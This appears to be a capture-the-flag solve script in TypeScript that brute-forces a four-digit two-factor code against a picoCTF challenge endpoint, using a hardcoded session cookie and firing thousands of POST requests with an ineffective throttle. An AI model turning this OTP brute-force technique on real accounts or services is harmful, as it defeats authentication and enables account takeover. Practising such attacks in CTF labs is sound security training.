// guess 2fa
//

import { sleep } from "bun";

async function guessFA(code: number) {
  const req = await fetch("http://foggy-cliff.picoctf.net:55708/two_fa", {
    method: "POST",
    headers: {
      Cookie:
        'session=".eJwty0sKgCAQANC7zFoitRjzMjHUJII_1FbR3XPR9sF7IGTn-AQLF4XGICD3sjc-KveBClf9W_eRW6dYwEpELeWizTahMTNKJeBuXBNFHonO6BO8H0X5HGE.aa-UFQ.dvT7CYvLDulZ5qlK1CWsMMVtcFE"',
      "Content-Type": "application/x-www-form-urlencoded",
    },
    body: `otp=${code}&action=`,
  });
  const res = await req.text();
  if (
    res.includes(`<span class="white-text">Invalid OTP or OTP expired</span>`)
  ) {
    return;
  }
  console.log(res);
}

let lastStop = 1000;
for (let i = 1000; i < 10000; i++) {
  guessFA(i);
  if (i - lastStop === 500) sleep(1000);
}
